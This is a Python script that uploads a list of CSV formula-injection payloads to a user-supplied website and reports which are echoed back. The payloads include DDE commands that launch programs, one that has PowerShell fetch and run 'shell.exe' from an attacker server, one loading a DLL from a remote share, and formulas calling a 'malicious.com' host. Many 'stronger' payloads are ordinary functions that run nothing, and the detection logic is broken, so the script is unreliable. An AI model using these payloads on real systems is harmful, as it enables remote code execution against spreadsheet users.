import requests
from urllib.parse import urljoin

# Function to generate CSV injection payloads
def generate_payloads():
    payloads = [
        '";=2+3-1+cmd|\' /C calc\'!A0 //',
        '";=2+3-1+cmd|\' /C notepad\'!A0 //',
        '"=HYPERLINK("http://malicious.com", "Click Here")',
        '=cmd|\' /C calc\'!A0',
        '=cmd|\' /C notepad\'!A0',
        '=IMPORTXML("http://malicious.com", "//")',
        '";=2+3-1+cmd|\' /C calc\'!A0 //',
        '";=2+3-1+cmd|\' /C notepad\'!A0 //',
        '"=HYPERLINK("http://malicious.com", "Click Here")',
        '=cmd|\' /C calc\'!A0',
        '=cmd|\' /C notepad\'!A0',
        '=IMPORTXML("http://malicious.com", "//")',
        '"=MID("cmd /c calc",1,1)&MID("cmd /c calc",2,1)&MID("cmd /c calc",3,1)&MID("cmd /c calc",4,1)&MID("cmd /c calc",5,1)&MID("cmd /c calc",6,1)&MID("cmd /c calc",7,1)&MID("cmd /c calc",8,1)&MID("cmd /c calc",9,1)&MID("cmd /c calc",10,1)&MID("cmd /c calc",11,1)&MID("cmd /c calc",12,1)&MID("cmd /c calc",13,1)&MID("cmd /c calc",14,1)&MID("cmd /c calc",15,1)&MID("cmd /c calc",16,1)&MID("cmd /c calc",17,1)&MID("cmd /c calc",18,1)&MID("cmd /c calc",19,1)&MID("cmd /c calc",20,1)',
        '=WEBSERVICE("http://malicious.com")',
        '"&cmd /c calc&"',
        '=CONCATENATE("cmd /c calc")',
        '=cmd /c calc&""',
        '=INDIRECT("A1",TRUE())',
        '=HYPERLINK("cmd /c calc")',
        '"&cmd /c notepad&"',
        '=EXEC("cmd /c calc")',
        '=cmd /c calc&"1"',
        '=EXEC("cmd /c notepad")',
        '=cmd /c notepad&"1"',
        '=TRIM("=cmd /c calc")',
        '=cmd /c calc&"',
        '=DDE("cmd";"/C calc";"!A0")A0',
        '@SUM(1+9)*cmd|\' /C calc\'!A0',
        '=10+20+cmd|\' /C calc\'!A0',
        '=cmd|\' /C notepad\'!\'A1\'',
        '=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0',
        '=cmd|\'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1',
        # Stronger and higher vulnerability payloads
        '=INDEX(INDIRECT("cmd | /c calc"),1)',
        '=MDETERM(TRANSPOSE("cmd /c calc"))',
        '=MINVERSE("cmd /c calc")',
        '=MMULT("cmd /c calc","cmd /c calc")',
        '=MODE.MULT("cmd /c calc")',
        '=NEGBINOM.DIST(1,1,"cmd /c calc",1)',
        '=NORM.INV("cmd /c calc",1)',
        '=NORM.S.INV("cmd /c calc")',
        '=PERMUT("cmd /c calc",1)',
        '=REPLACE("cmd /c calc",1,1)',
        '=SEQUENCE("cmd /c calc",1,1,1)',
        '=SERIESSUM("cmd /c calc",1,1,1)',
        '=SKEW.P("cmd /c calc")',
        '=SLOPE("cmd /c calc","cmd /c calc")',
        '=SLN("cmd /c calc","cmd /c calc",1)',
        '=SLOPE("cmd /c calc","cmd /c calc")',
        '=SORT("cmd /c calc")',
        '=SLOPE("cmd /c calc","cmd /c calc")',
        '=STDEV.P("cmd /c calc")',
        '=T("cmd /c calc")',
        '=XIRR("cmd /c calc","cmd /c calc")',
        '=XLOOKUP("cmd /c calc","cmd /c calc","cmd /c calc")',
        '=XMATCH("cmd /c calc","cmd /c calc",1)',
        '=Z.TEST("cmd /c calc","cmd /c calc",1)',
        '=VAR.P("cmd /c calc")',
        '=VAR.S("cmd /c calc")',
        '=VARA("cmd /c calc")',
        '=VARP("cmd /c calc")',
        '=VLOOKUP("cmd /c calc","cmd /c calc",1)',
        '=UNICODE("cmd /c calc")',
        '=VALUE("cmd /c calc")',
        '=UPPER("cmd /c calc")',
        '=UNIQUE("cmd /c calc")',
        '=UNPIVOT("cmd /c calc")',
        '=VALUE("cmd /c calc")',
        '=XML("cmd /c calc","cmd /c calc")',
        '=XOR("cmd /c calc","cmd /c calc")',
        '=YEAR("cmd /c calc")',
        '=Z.TEST("cmd /c calc","cmd /c calc",1)'
    ]
    return payloads

# Function to check for CSV Injection vulnerability
def check_csv_injection_vulnerability(url):
    print("Checking for CSV Injection vulnerability...")
    target_url = urljoin(url, "vulnerable_endpoint.csv")
    payloads = generate_payloads()
    vulnerable_payloads = []

    for payload in payloads:
        # Create a sample CSV payload with malicious content
        malicious_csv = f'header1,header2\nvalue1,{payload}'

        # Upload the payload to the target URL
        files = {'file': malicious_csv}
        response = requests.post(target_url, files=files)

        # Analyze response status code and headers
        status_code = response.status_code
        content_type = response.headers.get('Content-Type', '')

        if status_code == 200 and 'text/csv' in content_type:
            # Check if the payload was successfully executed
            if payload in response.text:
                # Assess vulnerability metric
                if 'exec' in payload.lower():
                
                 if 'exec' in payload.lower() or 'cmd' in payload.lower():
                    vulnerability_metric = "high"
                 else:
                    vulnerability_metric = "medium"
                 vulnerable_payloads.append((payload, vulnerability_metric))
        
        # Clean up temporary file
        if 'file' in files:
            del files['file']
    
    if vulnerable_payloads:
        print("Vulnerable payloads:")
        for payload, metric in vulnerable_payloads:
            print(f"Payload: {payload}, Metric: {metric}")
    else:
        print("No vulnerable payloads found.")

def main():
    target_website = input("Enter your target website URL:")
    check_csv_injection_vulnerability(target_website)

if __name__ == "__main__":
    main()
